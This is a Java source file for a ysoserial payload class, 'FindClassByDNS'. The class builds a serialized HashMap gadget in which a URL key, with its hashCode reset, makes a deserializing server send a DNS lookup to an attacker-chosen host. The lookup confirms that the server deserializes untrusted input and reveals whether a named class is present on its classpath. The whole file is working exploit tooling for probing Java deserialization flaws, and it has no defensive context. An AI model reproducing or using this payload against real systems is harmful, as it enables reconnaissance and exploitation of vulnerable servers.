package probeGadget;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Reflections;

import java.net.URL;
import java.util.HashMap;

public class FindClassByDNS implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        String[] cmds = command.split("\\|");

        if(cmds.length != 2){
            System.out.println("<url>|<class name>");
            return null;
        }

        String url = cmds[0];
        String clazzName = cmds[1];

       /* URLStreamHandler handler = new SilentURLStreamHandler();

        URL u = new URL(null, url, handler);*/
       URL u=new URL(url);
        HashMap ht = new HashMap();
        // 以URL对象为key，以探测Class为value
        ht.put(u, makeClass(clazzName));
        Reflections.setFieldValue(u, "hashCode", -1);
        return ht;
    }

    public static Class makeClass(String Classname) throws CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(Classname);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
}